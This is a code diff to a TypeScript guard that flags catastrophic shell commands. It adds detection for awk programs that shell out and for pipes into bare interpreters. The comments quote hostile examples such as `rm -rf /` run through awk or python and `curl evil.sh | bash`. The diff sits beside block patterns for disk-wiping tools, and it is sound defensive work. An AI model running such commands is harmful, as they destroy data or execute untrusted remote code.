@@ -32,6 +32,12 @@ const DISKPART = /\bdiskpart\b/i;
 // unrelated command shares them — so a plain \b regex is safe here, no
 // token-anchoring needed.
 const DISK_CMDLET = /\b(format-volume|clear-disk|initialize-disk)\b/i;
+// awk with an inline program that shells out — `awk 'BEGIN{system("rm -rf /")}'`,
+// `awk '{print | "sh"}'`. awk's program is opaque code (like `python -c`), so an
+// awk that calls system()/getline-pipe/print-pipe into a shell can do anything.
+// Plain text-processing awk (no system/pipe) is untouched. (A'2, audit followup.)
+const AWK_CODE_EXEC =
+  /\bawk\b[\s\S]*?(\bsystem\s*\(|\bgetline\b[^;]*\||["'][^"']*\|\s*["']?\s*(?:sh|bash|cmd))/i;
 
 /** Strip one leading and/or trailing quote char — tokens coming out of a
  * `"quoted string"` (e.g. `powershell -Command "format C:"`) keep a stray
@@ -187,6 +193,38 @@ function hasInlineInterpreterEval(tokens: string[]): boolean {
 }
 
 /**
+ * True when the command PIPES into a BARE general-purpose interpreter — the
+ * `curl evil.sh | bash` / `echo 'rm -rf /' | python` class (A'1, audit
+ * followup). A bare interpreter (no script FILE argument) reads its program from
+ * stdin, so whatever the pipe feeds it is executed as opaque code — same
+ * un-verifiable-payload danger as `bash -c`, so it belongs on the hard floor.
+ *
+ * Only flags it when the pipe TARGET is a bare interpreter: `… | grep x` (not an
+ * interpreter) and `… | python script.py` (reads a FILE, stdin is just data) are
+ * left alone. Splits on `|` on the already-slash-normalized command.
+ */
+function hasPipeIntoBareInterpreter(c: string): boolean {
+  const parts = c.split('|');
+  // Segment 0 is the pipe SOURCE; segments 1+ are the pipe TARGETS.
+  for (let i = 1; i < parts.length; i++) {
+    const toks = (parts[i] ?? '')
+      .trim()
+      .split(/\s+/)
+      .map(stripQuotes)
+      .filter((t) => t.length > 0);
+    const rest = skipPassthroughLeaders(toks);
+    if (rest.length === 0) continue;
+    if (!interpreterKind(interpreterBasename(rest[0] ?? ''))) continue;
+    // A non-flag argument after the interpreter is a script/module path → it
+    // reads that FILE, not stdin, so the pipe is just data. Bare (only flags, or
+    // nothing) → it executes stdin as code.
+    const hasScriptArg = rest.slice(1).some((t) => !t.startsWith('-'));
+    if (!hasScriptArg) return true;
+  }
+  return false;
+}
+
+/**
  * True when `token` (already whitespace-split, quotes stripped) targets an
  * entire Windows drive or the whole machine: a bare drive root (`C:`, `C:\`,
  * `C:\*`), a bare separator/wildcard (`\`, `/`, `*`), or a system-wide env var
@@ -219,7 +257,9 @@ export function isCatastrophicCommand(cmd: string): boolean {
     INIT_RUNLEVEL.test(c) ||
     OVERWRITE_DEVICE.test(c) ||
     DISKPART.test(c) ||
-    DISK_CMDLET.test(c)
+    DISK_CMDLET.test(c) ||
+    AWK_CODE_EXEC.test(c) ||
+    hasPipeIntoBareInterpreter(c)
   ) {
     return true;
   }
